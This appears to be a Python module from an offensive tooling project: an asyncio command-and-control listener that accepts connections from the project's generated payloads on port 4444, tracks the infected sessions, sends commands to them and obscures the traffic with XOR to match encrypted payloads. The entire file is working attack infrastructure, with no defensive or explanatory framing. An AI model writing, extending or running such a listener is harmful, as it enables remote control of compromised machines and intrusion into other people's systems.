# c2 listener module
# asyncio-based handler that can receive connections from our generated payloads
# supports xor-encrypted streams to match the encrypted payload option

import asyncio
import socket


class C2Listener:
    """lightweight c2 handler for nextral payloads"""

    def __init__(self, host="0.0.0.0", port=4444, xor_key=0):
        self.host = host
        self.port = port
        self.xor_key = xor_key
        self.sessions = {}  # id -> (reader, writer)
        self._next_id = 1
        self._server = None
        self._running = False
        self.on_connect = None   # callback(session_id, addr)
        self.on_data = None      # callback(session_id, data)
        self.on_disconnect = None # callback(session_id)

    def _xor(self, data: bytes) -> bytes:
        """apply xor cipher if key is set"""
        if self.xor_key == 0:
            return data
        return bytes([b ^ self.xor_key for b in data])

    async def _handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """handle an incoming session"""
        addr = writer.get_extra_info("peername")
        sid = self._next_id
        self._next_id += 1
        self.sessions[sid] = (reader, writer)

        if self.on_connect:
            self.on_connect(sid, addr)

        try:
            while True:
                data = await reader.read(4096)
                if not data:
                    break
                decrypted = self._xor(data)
                if self.on_data:
                    self.on_data(sid, decrypted.decode(errors="replace"))
        except (asyncio.CancelledError, ConnectionResetError):
            pass
        finally:
            writer.close()
            self.sessions.pop(sid, None)
            if self.on_disconnect:
                self.on_disconnect(sid)

    async def send(self, session_id: int, data: str):
        """send a command to a connected session"""
        if session_id not in self.sessions:
            return
        _, writer = self.sessions[session_id]
        encrypted = self._xor(data.encode())
        writer.write(encrypted)
        await writer.drain()

    async def start(self):
        """start listening for connections"""
        self._server = await asyncio.start_server(
            self._handle_client, self.host, self.port
        )
        self._running = True

    async def stop(self):
        """shut down the listener and drop all sessions"""
        self._running = False
        if self._server:
            self._server.close()
            await self._server.wait_closed()

        for sid, (_, writer) in list(self.sessions.items()):
            writer.close()
        self.sessions.clear()

    @property
    def is_running(self) -> bool:
        return self._running
